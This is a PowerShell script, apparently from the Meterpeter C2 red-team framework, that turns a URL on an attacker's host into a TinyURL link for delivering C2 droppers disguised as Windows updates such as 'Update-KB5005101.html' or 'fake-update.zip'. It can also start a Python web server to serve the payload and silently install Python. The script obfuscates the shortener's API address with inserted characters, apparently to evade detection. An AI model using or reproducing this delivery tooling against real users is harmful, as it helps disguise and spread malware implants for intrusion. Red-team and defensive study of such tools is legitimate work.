<#
.SYNOPSIS
   TinyUrl url generator

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Invoke-WebRequest
   Optional Dependencies: http.server {manual}
   PS cmdlet Dev version: v1.1.5

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.12 that generates
   tinyurl links to deliver droppers (cradles) in local LAN.

.NOTES
   This cmdlet creates tinyurl links to deliver Meterpeter C2
   droppers (cradles) in local LAN, and its automatic executed.

   shorturl.ps1 cmdlet only delivers payloads on local LAN
   If invoked -startserver 'true' then cmdlet starts http.server
   parameter -serverport contains: "attacker IP addr : http.server port"
   shorturl.ps1 directory its used as http.server working directory if invoked -startserver 'true'
   The webpage.html\binary.exe of -payloadname to deliver must be on the same dir as shorturl.ps1

.Parameter ServerPort
   Attacker IP : http.server port (default: 192.168.1.72:8087)

.Parameter PayloadName
   Meterpeter C2 dropper name (default: Update-KB5005101.html)

.Parameter StartServer
   Start http.server process? (default: false)

.Parameter Verb
   Use TinyUrl verbose output? (default: false)

.Parameter SilentInstall
   Silent Install of python3?  (default: false)
  
.EXAMPLE
   PS C:\> .\shorturl.ps1 -ServerPort '127.0.0.1:8080'
   URI: http://127.0.0.1:8080/Update-KB5005101.html

.EXAMPLE
   PS C:\> .\shorturl.ps1 -ServerPort '192.168.1.72:8087' -PayloadName 'update.html'
   URI: http://192.168.1.72:8087/update.html

.EXAMPLE
   PS C:\> .\shorturl.ps1 -PayloadName 'fake-update.zip' -Verb 'true'
   URI: http://192.168.1.72:8087/fake-update.zip ( verbose outputs )

.EXAMPLE
   PS C:\> .\shorturl.ps1 -serverport '127.0.0.1:8081' -startserver 'true'
   URI: http://127.0.0.1:8081/Update-KB5005101.html ( start http.server )

.EXAMPLE
   PS C:\> .\shorturl.ps1 -Payloadname 'mozlz4-win32.exe' -startserver 'true'
   URI: http://192.168.1.72:8087/mozlz4-win32.exe ( start http.server )

.INPUTS
   None. You cannot pipe objects into shorturl.ps1

.OUTPUTS
   [i] Raw Url       : http://192.168.1.72:8080/Update-KB5005101.html

   StatusCode        : 200
   StatusDescription : OK
   Content           : https://tinyurl.com/yyx9xptu
   RawContent        : HTTP/1.1 200 OK
                       Connection: keep-alive
                       X-Content-Type-Options: nosniff
                       X-XSS-Protection: 1; mode=block
                       CF-Cache-Status: DYNAMIC
                       CF-RAY: 703551185c40da82-LIS
                       alt-svc: h3=":443"; ma=86400, h3-29="...
   Forms             : {}
   Headers           : {[Connection, keep-alive], [X-Content-Type-Options, nosniff], [X-XSS-Protection, 1; mode=block],
                       [CF-Cache-Status, DYNAMIC]...}
   Images            : {}
   InputFields       : {}
   Links             : {}
   ParsedHtml        : mshtml.HTMLDocumentClass
   RawContentLength  : 28

   [i] Shorten Uri  : https://tinyurl.com/yyx9xptu
   * 06:07:18: Starting python http.server ..

.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PayloadName="Update-KB5005101.html",
   [string]$ServerPort="192.168.1.72:8087",
   [string]$SilentInstall="false",
   [string]$StartServer="false",
   [string]$Verb="false"
)


$testServer = $null
#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"

#Shorten Url function
$Uri = "https://$ServerPort/$PayloadName" -replace 'ps:','p:'
$UrlApi = 'https://tin€yu€rl.c€om/api-cr€eat€e.p€hp' -replace 'ps:','p:' -replace '€',''
$Response = Invoke-WebRequest ("{0}?url={1}" -f $UrlApi, $Uri)


If($Response)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - generates tinyurl links to deliver droppers (cradles) in local LAN.
   #>

   If($Verb -ieq "True")
   {
      #Cmdlet verbose display fuction
      write-host "[i] Raw Url       : $Uri" -ForeGroundColor Black -BackGroundColor white
      $Response
   }

   #Store uri in local variable.
   $GetShortenUrl = $Response.Content

   #Display onscreen the tinyurl uri
   If($Response.StatusCode -eq 200 -and $GetShortenUrl -ne $null)
   {
      Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
   }
   Else
   {
      Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "x" -ForeGroundColor Red -NoNewline;
      Write-Host "] fail to retrieve tinyurl uri .." -ForeGroundColor DarkGray
   }

   If($StartServer -ieq "true")
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Start http.server to deliver payloadname on local LAN

      .NOTES
         Remark: PayloadName must be on shortcut.ps1 current directory.
         Parameter -payloadname 'bin.exe' can be invoked together with
         param -startserver 'true' to deliver 'bin.exe' on local LAN.
      #>

      try{
         $testServer = python -V
      }Catch{
         Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "x" -ForeGroundColor Red -NoNewline;
         Write-Host "] cmdlet cant find python interpreter .." -ForeGroundColor DarkGray      
      }

      If($testServer)
      {
         $ServerTime = Date -Format 'hh:mm:ss'
         $HttpAddr = $ServerPort.Split(':')[0];$HttpPort = $ServerPort.Split(':')[1]
         Write-Host "* ${ServerTime}: Starting python http.server .." -ForeGroundColor Green
         Start-Process powershell -ArgumentList "python -m http.server $HttpPort --bind $HttpAddr"
      }
      Else
      {
         If($SilentInstall -ieq "True")
         {

            <#
            .SYNOPSIS
               Author: @r00t-3xp10it
               Helper - Force the Silent Install of python3 ( http.server )

            .NOTES
               This function stores current architecture to be abble
               to download \ Silent install the python3.msi pacakage
               Remark: Python3 package will be installed for 'ALL USERS'
            #>

            #Silent install python3 ( http.server )
            Write-Host "  => Download\Silent install python 3.0" -ForeGroundColor DarkYellow
            If($Env:PROCESSOR_ARCHITECTURE -iMatch '^(AMD64)$')
            {
               $PyVersion = "python-3.0.amd64.msi"
               iwr -uri "https://www.python.org/ftp/python/3.0/python-3.0.amd64.msi" -OutFile "python-3.0.amd64.msi"|Unblock-File         
            }
            Else
            {
               $PyVersion = "python-3.0.msi"
               iwr -uri "https://www.python.org/ftp/python/3.0/python-3.0.msi" -OutFile "python-3.0.msi"|Unblock-File           
            }

            try{
               ## Run installer ( Silence )
               # https://silentinstallhq.com/python-2-7-silent-install-how-to-guide/
               MsiExec.exe /i $PyVersion ALLUSERS=1 ADDLOCAL=ALL /qn
            }Catch{}

            #Start webserver in current dir
            $ServerTime = Date -Format 'hh:mm:ss'
            $HttpAddr = $ServerPort.Split(':')[0];$HttpPort = $ServerPort.Split(':')[1]
            Write-Host "* ${ServerTime}: Starting python http.server .." -ForeGroundColor Green
            Start-Process powershell -ArgumentList "python -m http.server $HttpPort --bind $HttpAddr"
         }

      }
   }

}
Else
{
   Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
   Write-Host "x" -ForeGroundColor Red -NoNewline;
   Write-Host "] fail to retrieve tinyurl uri .." -ForeGroundColor DarkGray
}
